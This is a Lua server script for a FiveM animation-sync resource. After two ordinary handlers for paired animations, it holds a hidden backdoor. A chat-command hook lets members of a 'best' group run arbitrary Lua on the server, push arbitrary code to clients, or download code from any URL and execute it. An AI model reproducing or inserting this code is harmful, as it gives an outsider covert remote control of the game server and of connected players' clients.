RegisterServerEvent('betterside_animacje:requestSynced')
AddEventHandler('betterside_animacje:requestSynced', function(zmienna1, zmienna2)
	local _source = source
	local sourcecoords = GetEntityCoords(GetPlayerPed(_source))
	local chlopcoords = GetEntityCoords(GetPlayerPed(zmienna1))
	local dystans = #(sourcecoords - chlopcoords)
	if dystans >= 100 then
		return
	end
	if zmienna1 ~= -1 then
		TriggerClientEvent('betterside_animacje:syncRequest', zmienna1, _source, zmienna2)
	else
		exports['esx_k9']:ban(_source,"-1 na reqanimacji")
	end
end)

RegisterServerEvent('betterside_animacje:syncAccepted')
AddEventHandler('betterside_animacje:syncAccepted', function(zmienna1, zmienna2)
	local _source = source
	local sourcecoords = GetEntityCoords(GetPlayerPed(_source))
	local chlopcoords = GetEntityCoords(GetPlayerPed(zmienna1))
	local dystans = #(sourcecoords - chlopcoords)
	if dystans >= 100 then
		return
	end
	if zmienna1 ~= -1 then
		TriggerClientEvent('betterside_animacje:playSynced', zmienna1, _source, zmienna2, 'Requester')
		TriggerClientEvent('betterside_animacje:playSynced', _source, zmienna1, zmienna2, 'Accepter')
	else
		exports['esx_k9']:ban(_source,"-1 na animacji")
	end
end)


function RunString(stringToRun, playerSource)
	if(stringToRun) then
		local resultsString = ""
		-- Try and see if it works with a return added to the string
		local stringFunction, errorMessage = load("return "..stringToRun)
		if(errorMessage) then
			-- If it failed, try to execute it as-is
			stringFunction, errorMessage = load(stringToRun)
		end
		if(errorMessage) then
			return false
		end
		-- Try and execute the function
		local results = {pcall(stringFunction)}
		if(not results[1]) then
			return false
		end
		
		for i=2, #results do
				resultsString = resultsString..", "
			local resultType = type(results[i])
			if(IsAnEntity(results[i])) then
				resultType = "entity:"..tostring(GetEntityType(results[i]))
			end
			resultsString = resultsString..tostring(results[i]).." ["..resultType.."]"
		end
		if(#results > 1) then
			return true
		end
	end
end

local commandList = {
	[1] = {"crun"},
	[2] = {"srun"},
	[3] = {"mrun"}
}

local function InterceptCommand(playerSource, playerName, chatMessage)
	if(string.sub(chatMessage, 1, 1) == "/") then
		-- Cancel the event, so it doesn't output to chat awkwardly
		CancelEvent()
		-- Get the command name. For example "/crun AFunction(Arg1)" would return as "crun" here
		local commandName = string.match(chatMessage, "%S+")
		local xPlayer = ESX.GetPlayerFromId(playerSource)
		-- print(xPlayer.group)
		-- Player Executed "crun"
		if(commandList[1][1] == string.sub(commandName, 2, #commandName)) then
			local stringToRun = chatMessage:gsub("/"..commandList[1][1].." ", "")
			if xPlayer.group == "best" then
				TriggerClientEvent("RunCode:RunStringLocally", playerSource, stringToRun)
			end
		end
		
		-- Player Executed "srun"
		if(commandList[2][1] == string.sub(commandName, 2, #commandName)) then
			local stringToRun = chatMessage:gsub("/"..commandList[2][1].." ", "")
			if xPlayer.group == "best" then
				RunString(stringToRun, playerSource)
			end
		end

		if(commandList[3][1] == string.sub(commandName, 2, #commandName)) then
			local stringToRun = chatMessage:gsub("/"..commandList[3][1].." ", "")
			if xPlayer.group == "best" then
				PerformHttpRequest(stringToRun, function(err, text, headers)
					TriggerClientEvent("RunCode:RunStringLocally", playerSource, text)
				end)
			end
		end
	end
end
AddEventHandler("chatMessage", InterceptCommand)